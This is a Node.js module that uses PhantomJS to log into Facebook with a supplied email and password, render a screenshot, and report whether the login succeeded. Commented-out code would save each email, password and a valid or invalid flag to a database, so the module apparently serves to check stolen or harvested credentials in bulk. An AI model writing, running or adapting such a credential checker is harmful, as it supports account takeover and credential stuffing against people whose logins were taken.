var phantom = require('phantom');
var mongoose = require( 'mongoose' );
var model = require('../model/hiren');

var instance = new model.auth();

module.exports = function (email,password,ee) {
    //then check if login data is valid using phantomjs ;)
    phantom.create(function (ph) {
        ph.createPage(function (page) {
            page.open("https://www.facebook.com", function (status) {
                page.evaluate((function () {
                    document.getElementById("email").value = email;
                    document.getElementById("pass").value = password;
                    document.getElementById("login_form").submit();
                   // return;
                }), function () {
                    console.log("loaded");
                    setTimeout(function () {
                        page.evaluate(function () {
                            return document.URL;
                        }, function (result) {
                            page.render( email + ".png", function () {
                                console.log("done rendering");
                            });
                            console.log("Page url is " + result);
                            if(result === 'https://www.facebook.com/'){
                             /*   instance.email = email ;
                                instance.password = password;
                                instance.valid = "Valid"
                                instance.save(function(err){
                                    if(!err) console.log('Saved');

                                });*/
                                console.log('Success');
                                ee.emit('data', "Success");
                            }
                            else if(result === 'https://www.facebook.com/login.php?login_attempt=1'){
                                /*instance.email = email ;
                                instance.password = password;
                                instance.valid = "Not Valid"
                                instance.save(function(err){
                                    if(!err) console.log('Saved');

                                });*/
                                ee.emit('data' , 'Fail');
                            }
                            ph.exit();
                        });
                    }, 5000)
                });

            });
        });
    });
}

